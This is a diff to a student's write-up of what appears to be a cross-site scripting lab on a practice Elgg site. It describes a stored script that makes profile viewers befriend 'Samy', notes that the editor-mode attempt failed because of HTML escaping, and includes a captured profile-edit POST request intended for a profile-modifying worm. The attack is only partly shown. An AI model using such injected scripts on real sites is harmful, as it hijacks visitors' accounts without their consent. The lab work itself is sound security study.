@@ -80,11 +80,14 @@ window.onload = function () {
 ```
 ![attack](Task4-1-1.PNG)
 
-Then I made sure Samy and Alice are not friends. [verify](Task4-1-2.PNG)
-Next I searched for Samy as Alice [search](Task4-1-3.png)
+Then I made sure Samy and Alice are not friends. (To save a little space, I have provided the [Link](Task4-1-2.PNG) if you would like to see it)
+Next I searched for [Samy as Alice](Task4-1-3.png) and viewed [Samy's profile](Task4-1-4.PNG). When I go back to view Alice's friend list:
+
+![success](Tassk4-1-5.PNG)
+We can see that Samy is a friend of Alice but Alice never had that request. When I logged in as Samy, I could see that Samy and Alice had made Samy a friend. Since we never said in the code that Samy should not add himeself as a friend, it happened when we viewed Samy's profile as Samy.
 
 ##### Task 4.2:
-
+This time, we are trying to see if Editor mode is going to launch the attack. Before I tried this, I deleted everyone as a friend and the original code. As we can see, [no one](Task4-2-1.PNG) is Samy's friend and [no one](Task4-2-2.PNG) has made friend with Samy. Then I included the same code in the editor mode:
 ```
 <script type="text/javascript">
 window.onload = function () {
@@ -103,27 +106,25 @@ window.onload = function () {
 }
 </script>
 ```
+![attack](Task4-2-3.PNG)
+![profile](Task4-2-4.PNG)
+![inspector](Task4-2-5.PNG)
+![unsuccessful](Task4-2-6.PNG)
+Then when we viewed Samy's profile, the whole code appears. When we opened the inspector tool, we can see that "<" has been converted to &lt and ">" has been converted to &gt while being wrapped in paragraph tag. When we view Samy's friend, it is still blank. To verify that it is not because of my code, I did it again in [Brief description](Task4-2-7) and logged in as Charlie to test it out. When I went back to [Samy's friend list](Task4-2-8). Both Charlie and Samy appeared. Thus, we can conclude that adding the code in editor's mode is unsuccessful.
 
 ### Task 5:
 
 ##### Task 5.1:
+In this task, we are trying to modify other people's profile page if they view ours. In order to accomplish this, I have to first understand how update profile is used. Therefore, I looked to burp suite for help:
 ```
 POST /action/profile/edit HTTP/1.1
-
 Host: www.xsslabelgg.com
-
 Content-Length: 2536
-
 Cache-Control: max-age=0
-
 Upgrade-Insecure-Requests: 1
-
 Origin: http://www.xsslabelgg.com
-
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywTWFRbcqOckh4hVo
-
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Referer: http://www.xsslabelgg.com/profile/samy/edit
 Accept-Encoding: gzip, deflate
@@ -133,92 +134,67 @@ Connection: close
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="__elgg_token"
 hlaPgUV7HjfhLOIUsQfU1Q
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="__elgg_ts"
 1615410743
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="name"
 Samy
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="description"
 <p>This is a test</p>
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[description]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="briefdescription"
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[briefdescription]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="location"
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[location]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="interests"
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[interests]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="skills"
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[skills]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="contactemail"
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[contactemail]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="phone"
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[phone]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="mobile"
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[mobile]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="website"
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[website]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="twitter"
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="accesslevel[twitter]"
 2
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo
 Content-Disposition: form-data; name="guid"
 59
-
 ------WebKitFormBoundarywTWFRbcqOckh4hVo--
-
 ```
 
 ```
